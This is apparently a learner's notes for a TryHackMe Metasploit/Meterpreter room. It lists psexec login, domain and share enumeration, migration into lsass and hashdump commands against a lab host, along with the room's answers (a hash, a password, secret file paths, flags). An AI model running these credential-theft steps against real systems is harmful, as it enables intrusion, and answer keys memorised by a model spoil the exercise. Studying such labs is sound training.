
#Metasploit 

- https://tryhackme.com/room/meterpreter
- https://www.youtube.com/watch?v=96V-nwvtaks

```
START MACHINE

msfocnsole
search exploit/windows/smb/psexec
use 0

show options
set rhost 10.10.54.126
show options
set smbuser ballen
set smbpass Password1
show options
run

sysinfo
acme-test

background
sessions -i
use post/windows/gather/enum_domain

set session 1
run

flash.local  == target domain

use post/windows/gather/enum_shares

speedster

"lsass.exe" process first (ps will list its PID), then run "hashdump".
ps

session -i 1
migrate 772
hashdump

69596c7aa1e8daee17f8e78870e25a5c

Trustno1

commands: search -f *.txt search -f secrets.txt

c:\program files (x86)\Windows multimedia platform\secrets.txt

Use the cat command to see the content of the file.

KDSvbsw3849

  
Where is the "realsecret.txt" file located?

c:\inetpub\wwwroot\realsecret.txt

the flash is the fastest man alive

```